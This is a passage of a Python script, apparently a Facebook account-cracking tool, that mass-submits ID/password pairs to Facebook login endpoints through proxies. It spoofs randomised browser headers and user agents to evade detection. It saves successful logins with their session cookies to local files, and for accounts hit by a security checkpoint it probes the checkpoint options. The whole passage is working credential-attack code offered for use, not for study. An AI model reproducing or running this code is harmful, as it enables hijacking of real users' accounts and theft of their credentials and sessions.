			"__req": rc(["1","2","3","4","5","6","7","8","9","0","a","b","c","d","f","g","h","i","j","k","l","m","n","n","o","p","q"]),
			"__a": "",
			"__user": "0",
			"_fb_noscript": "true"}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in link.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			ver = rc(["id-ID,id;q=0.9","ms-MY,ms;q=0.9","fr_FR,fr;q=0.9","jv-ID,jv;q=0.9"])  
			head = {"Host": url,
			"content-length": f"str(rr(2000,2999))",
			"sec-ch-ua": f'"Not.A/Brand";v="{str(rr(8,20))}", "Chromium";v="{str(rr(110,114))}", "Google Chrome";v="{str(rr(110,114))}"',
			"sec-ch-ua-mobile": "?1",
			"user-agent": ua,
			"viewport-width": f"str(rr(400,989)",
			"content-type": "application/x-www-form-urlencoded",
			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
			"sec-ch-ua-platform-version": f'"{str(rr(7,14))}.0.0"',
			"x-asbd-id": "129477",
			"x-requested-with": "XMLHttpRequest",
			"sec-ch-ua-full-version-list": f'"Not.A/Brand";v="{str(rr(8,20))}.0.0.0", "Chromium";v="{str(rr(110,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}", "Google Chrome";v="{str(rr(110,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}"',
			"sec-ch-prefers-color-scheme": "light",
			"sec-ch-ua-platform": '"Android"',
			"accept": "*/*",
			"origin": "https://"+url,
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"referer": ref,
			"accept-encoding": "gzip, deflate, br",
			"accept-language": ver}		
			links = rc([f"https://{url}/login/device-based/login/async/?api_key=266809897176355&auth_token=9e74c10df302b317fb711eeb7b478dc4&skip_api_login=1&signed_next=1&next=https%3A%2F%2F{url}%2Fv7.0%2Fdialog%2Foauth%3Fapp_id%3D266809897176355%26cbt%3D1694956577376%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df26dedb14c84ab%2526domain%253Dwww.signupgenius.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.signupgenius.com%25252Ff1e4e76b83b13a%2526relation%253Dopener%26client_id%3D266809897176355%26display%3Dtouch%26domain%3Dwww.signupgenius.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.signupgenius.com%252Fregister%26locale%3Den_US%26logger_id%3Df2de2085933efa%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df2785f21139e0cc%2526domain%253Dwww.signupgenius.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.signupgenius.com%25252Ff1e4e76b83b13a%2526relation%253Dopener%2526frame%253Df380e29c31da6c%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv7.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&refsrc=deprecated&app_id=266809897176355&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df2785f21139e0cc%26domain%3Dwww.signupgenius.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.signupgenius.com%252Ff1e4e76b83b13a%26relation%3Dopener%26frame%3Df380e29c31da6c%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&lwv=100"])
			CYXIEON_XR = ses.post(links,headers=head, data=date, cookies={'cookie': koki}, allow_redirects=False,proxies=proxs)
			if "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=CYXIEON_XR.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				print(f"{kun}╭────────────────────────────╮{puti}")
				tree = Tree("")
				tree.add(f"\r{hijo}{idf}{puti}").add(f"{hijo}{pw}{puti}").add(f"{mer}{tahun(idf)}{puti}")
				tree.add(f"{hijo}{kuki}{puti}").add(f"{mer}{ua}{puti}")
				print(f"{kun}╰────────────────────────────╯{puti}")
				prints(tree)
				open('CYXIEON-OK/'+'CYXIEON-OK.txt','a').write(idf+'|'+pw+'|'+'\n')
				open('CYXIEON-OK/'+'CYXIEON-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
				break			
			elif "checkpoint" in CYXIEON_XR.cookies.get_dict().keys():
				print(f"{kun}╭────────────────────────────╮{puti}")
				tree = Tree("")
				tree.add(f"\r{kun}{idf}{puti}").add(f"{kun}{pw}{puti}")
				tree.add(f"{mer}{tahun(idf)}{puti}").add(f"{mer}{ua}{puti}")
				print(f"{kun}╰────────────────────────────╯{puti}")
				prints(tree)
				open('CYXIEON-CP/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
				akune.append(idf+'|'+pw)
				ceker(idf,pw)
				cp+=1
				break	
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

#----------[ CEK-OPSI ]----------#	
def ceker(idf,pw):
	global cp
	rc = random.choice
	url = rc(["free.facebook.com"])
	head = {"Host": url,
"cache-control": "max-age=0",
"upgrade-insecure-requests": "1",
"origin": "https://"+url,
"content-type": "application/x-www-form-urlencoded",
"user-agent": "Mozilla/5.0 (Linux; Android 10; DOOGEE B10 Build/KOTG49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
"x-requested-with": "com.android.chrome",
"sec-fetch-site": "same-origin",
"sec-fetch-mode": "navigate",
"sec-fetch-user": "?1",
"sec-fetch-dest": "document",
"referer": f"https://{url}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",
"accept-encoding": "gzip, deflate",
"accept-language": "fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7"}
	ses = requests.Session()
	try:
		hi = ses.get('https://'+url)
		kontol = sop(ses.post(
		'https://'+url+'/login.php',
		data={
		'email':idf,
	'pass':pw,
'login':'submit'
		},headers=head, allow_redirects=True).text,'html.parser')
		jo = kontol.find(
		'form'
		)
		data = {}
		lion = [
		'nh',
	'jazoest',
'fb_dtsg',
	'submit[Continue]',
		'checkpoint_data'
		]
		for anj in jo('input'):
			if anj.get('name') in lion:
				data.update({anj.get('name'):anj.get('value')})
		kent = sop(ses.post('https://'+url+str(jo['action']), data=data, headers=head).text,'html.parser')
		opsi = kent.find_all('option')
		if len(opsi)==0:
			tree = Tree("")
			tree.add(f"{hijo}Tapyes / A2f ( cek di mbasic ){puti}")
			prints(tree)
			#open('CYXIEON-CP/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
			#cp+=1
		else:
			for opsii in opsi:
				print('\r%s---> %s%s'%(kk,opsii.text,x))
	except Exception as c:
		tree = Tree("")
		tree.add(f"{hijo}{idf}{puti}").add(f"{hijo}{pw}{puti}")
		tree.add(f"{mer}spam ip tidak dapat cek ops{puti}i")
		prints(tree)
		#open('CYXIEON-CP/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
		#cp+=1
		
#----------[ SYSTEM-CONTROL ]----------#	
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('CYXIEON-OK')
	except:pass
	try:os.mkdir('CYXIEON-CP')
	except:pass
	menu()
	
	
#>>>>> THANKS TO <<<<<#

#    *--> BASARI ID
#    *--> ALVINO ADIJAYA
#    *--> AOREC-XD

#>>>>> THANKS TO <<<<<#
